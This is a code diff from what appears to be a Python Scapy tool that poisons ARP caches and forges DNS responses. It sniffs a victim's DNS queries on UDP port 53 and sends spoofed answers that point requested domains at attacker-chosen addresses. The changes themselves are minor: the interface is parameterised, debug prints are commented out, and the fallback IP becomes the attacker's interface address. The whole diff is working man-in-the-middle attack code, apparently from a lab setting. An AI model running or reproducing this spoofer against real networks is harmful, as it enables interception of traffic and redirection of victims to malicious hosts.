@@ -9,22 +9,21 @@ def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface):
     
     while(True):
         arpPoison(hwA,hwV,ipV,ipG,interface)
-        pkt = sniff(count=1,iface="enp0s9",filter="udp port 53", timeout=0.2)
+        pkt = sniff(count=1,iface=interface,filter="udp port 53", timeout=1)
 
         if pkt:
             packetFound = checkForDns(pkt[0],ipV,urlsToSpoof)
             if packetFound:
                 return packetFound
-
     
 def checkForDns(pkt,ipV,urlsToSpoof):
     
     if pkt.haslayer(DNS):
             dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipV,urlsToSpoof)
-            print("packet found")
+            #print("packet found")
             return (pkt, dnsQueryFromVictim, goodUrl)
     else:
-        print("bad packet")
+        #print("bad packet")
         return ()
     
 
@@ -39,7 +38,6 @@ def getDnsMsgType(pkt,ipV,urlsToSpoof):
     
     else: 
         return (False, False)
-
 
 def dnsPoisoning(interface,a,urlsToSpoof):
 
@@ -60,13 +58,12 @@ def dnsPoisoning(interface,a,urlsToSpoof):
 	
                 dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
                 sendp(dnsResponse, iface=interface)
-                print("DNS response sent")
+                #print("DNS response sent")
 
         except KeyboardInterrupt:
             return
 
     return
-
 
 def dnsForgeResponse(pkt, urlsToSpoof):
 
@@ -76,7 +73,7 @@ def dnsForgeResponse(pkt, urlsToSpoof):
         ipA = urlsToSpoof[urlRequested]
 
     else:
-        ipA = "10.0.2.4"
+        ipA = get_if_addr('enp0s9')
 
     eth = Ether(
 	src = pkt[Ether].dst, 
